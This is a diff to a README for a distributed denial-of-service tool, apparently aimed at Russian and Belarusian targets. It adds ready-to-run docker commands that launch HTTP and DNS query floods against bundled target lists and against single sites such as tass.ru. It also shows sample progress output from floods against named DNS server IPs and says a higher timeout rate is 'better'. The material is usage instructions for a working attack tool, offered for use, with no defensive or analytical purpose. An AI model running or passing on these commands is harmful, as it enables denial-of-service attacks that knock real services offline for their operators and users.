@@ -55,7 +55,40 @@ NOTE: It may consume a lot of RAM as it tries to leave connections open for a as
 
 ## Docker
 
-Docker image is not on Dockerhub yet. Not sure if it is useful.
+You can run docker for all targets at the same time using this command:
+```
+$ docker run -d --restart unless-stopped ghcr.io/russkijkorablidinaxuj/russkijkorablidinaxuj:latest
+```
+
+If it is crashing due to OOM:
+```
+$ docker run -d --restart unless-stopped ghcr.io/russkijkorablidinaxuj/russkijkorablidinaxuj:latest -N 1000
+```
+
+You can also specify different target lists using `-i app/{target}.json`, where `{target}` can be one of:
+ - all.json
+ - belarus.json
+ - russia.json
+ - api.json
+ - dns.json
+
+It is possible to see attack progress using this command:
+```
+$ docker run -i --restart unless-stopped ghcr.io/russkijkorablidinaxuj/russkijkorablidinaxuj:latest -N 1000 -i /app/dns.json -s=false
+```
+The output will be something like this:
+```
+root@putinhujlo-ch1:~/RusskijKorablIdiNaxuj# docker run -i --restart unless-stopped ghcr.io/russkijkorablidinaxuj/russkijkorablidinaxuj:latest -N=5000 -i /app/dns.json -s=false
+dns://194.54.14.186:53  0 % [---------------------------] 0 / -1
+dns://194.54.14.186:53   5 % [>--------------------]  193 / 3978
+dns://194.54.14.187:53   6 % [>--------------------]  226 / 3685
+dns://194.67.7.1:53     94 % [===================>-] 4993 / 5284
+dns://194.67.2.109:53   90 % [==================>--] 3058 / 3414
+```
+
+The progress bar shows how many timeouts there are relative to the requests per second. The higher this ratio to 100% the better!
+
+NOTE: You can also specify single targets using `-i` command, e.g. `-i https://tass.ru/` (it must have either http or https. Also, `dns://` works too for dns query flood)
 
 # Important resources
 
